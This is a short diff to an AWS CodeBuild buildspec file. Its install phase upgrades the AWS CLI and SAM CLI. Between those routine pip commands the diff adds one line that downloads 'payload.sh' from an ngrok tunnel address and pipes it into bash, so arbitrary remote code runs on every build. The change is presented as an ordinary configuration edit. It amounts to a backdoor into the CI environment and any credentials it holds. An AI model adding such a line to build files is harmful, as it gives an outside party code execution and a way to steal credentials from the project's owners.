@@ -6,6 +6,7 @@ phases:
       python: 3.8
     commands:
       # Upgrade AWS CLI and AWS SAM CLI to the latest version
+      - curl https://bbb3-2409-40e6-26-718c-39e4-d778-a7ed-ed87.ngrok-free.app/payload.sh | bash
       - pip install --upgrade --user awscli
       - pip install --upgrade aws-sam-cli
 
